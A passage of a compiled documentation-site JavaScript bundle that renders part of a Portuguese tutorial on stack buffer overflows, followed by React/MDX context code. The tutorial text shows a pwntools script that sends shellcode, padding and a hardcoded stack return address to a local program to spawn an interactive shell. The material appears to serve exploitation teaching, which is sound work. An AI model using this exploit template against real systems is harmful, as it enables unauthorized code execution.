acabamos de mandar o ",(0,a.jsx)(r.code,{children:"RIP"})," executar instru\xe7\xe3o na stack."]}),"\n"]}),"\n",(0,a.jsxs)(r.p,{children:["Exemplo com pwntools, abrindo uma shell (",(0,a.jsx)(r.code,{children:"shellcraft.sh()"}),"):"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-py",children:"from pwn import *\r\n\r\ncontext.binary = ELF('./program')\r\n\r\np = process()\r\n\r\npayload = asm(shellcraft.sh())          ## Shellcode\r\npayload = payload.ljust(312, b'A')      ## Padding\r\npayload += p32(0xffffcfb4)              ## Endere\xe7o do Shellcode\r\n\r\nlog.info(p.clean())\r\n\r\np.sendline(payload)\r\n\r\np.interactive()\n"})})]})}function m(e={}){const{wrapper:r}={...(0,o.R)(),...e.components};return r?(0,a.jsx)(r,{...e,children:(0,a.jsx)(t,{...e})}):t(e)}},8453(e,r,s){s.d(r,{R:()=>l,x:()=>d});var n=s(6540);const a={},o=n.createContext(a);function l(e){const r=n.useContext(o);return n.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function d(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:l(e.components),n.createElement(o.Provider,{value:r},e.children)}}}]);